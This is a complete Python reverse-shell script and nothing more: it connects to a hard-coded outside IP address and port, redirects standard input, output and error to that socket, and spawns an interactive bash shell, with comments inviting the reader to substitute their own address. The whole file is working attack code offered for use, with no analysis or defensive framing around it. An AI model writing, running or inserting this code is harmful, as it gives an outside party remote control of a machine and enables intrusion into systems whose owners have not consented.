#!/usr/bin/env python3
import socket
import subprocess
import os
import pty

def reverse_shell():
    server_ip = "107.175.243.19"    # Replace with your IP
    server_port = 51000             # Replace with your port

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    # Redirect stdin, stdout, and stderr to the socket
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Spawn a shell
    pty.spawn("/bin/bash")

if __name__ == "__main__":
    reverse_shell()
